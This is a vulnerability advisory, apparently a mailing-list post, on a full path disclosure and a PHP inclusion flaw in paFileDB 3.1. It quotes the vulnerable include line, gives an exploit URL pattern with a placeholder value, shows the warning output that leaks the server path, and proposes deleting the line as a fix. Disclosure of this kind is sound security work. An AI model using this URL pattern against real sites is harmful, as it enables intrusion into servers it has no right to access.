[Persianhacker.net] Full Path Disclosure and PHP Injection In Pafiledb 3.1 Final

PafileDB
paFileDB is designed to allow webmasters have a database of files for download on \
their site. To add a download, all you do is upload the file using FTP or whatever \
method you use, log into paFileDB's admin center, and fill out a form to add a file. \
paFileDB lets you edit and delete the files too. No more messing with a bunch of HTML \
pages for a file database on your site! Using speedy MySQL for storing data, and \
powerful PHP for processing everything, paFileDB is one of the best and easiest ways \
to manage files! More info @:

Discussion:
--------------------
What is the bug ?
There is a Full Path Disclosure vulnerability in Pafiledb 3.1 which ends to \
disclosure of page local location on the web server.There is nother bug which let`s \
h4cK3r inject php codes and run them on server.

Where is the bug ?
At line 25 of pafiledb.php :

[
if ($login == "do") { include "./includes/$action/login.php"; exit; }
]

as we see $action is used in above statement and it`s not declared yet so h4ck3r can \
use it for PHP Injection attacks by passing his malicouse string from URL .

Exploit:
--------------------
[
<http://www.example.com/pafiledb.php?login=do&action=>[value]
]

which includes PHP codes in :

[
./includes/[value]/login.php
]

and if PHP page doesn`t realy exist at that address , server returns warring page \
like this :

[

Warning: main(./includes/value/login.php): failed to open stream: No such file or \
directory in /home/host/public_html/downloads/pafiledb.php on line 25

Warning: main(./includes/value/login.php): failed to open stream: No such file or \
directory in /home/host/public_html/downloads/pafiledb.php on line 25

Warning: main(): Failed opening './includes/value/login.php' for inclusion \
(include_path='.:/usr/lib/php:/usr/local/lib/php') in \
/home/host/public_html/downloads/pafiledb.php on line 25

]

and this message shows local address of pafiledb.php on server.

Solution:
--------------------
just remove line 25 of pafiledb.php ,there is no need for that line ( I wonder why \
coder ever used that ? ).
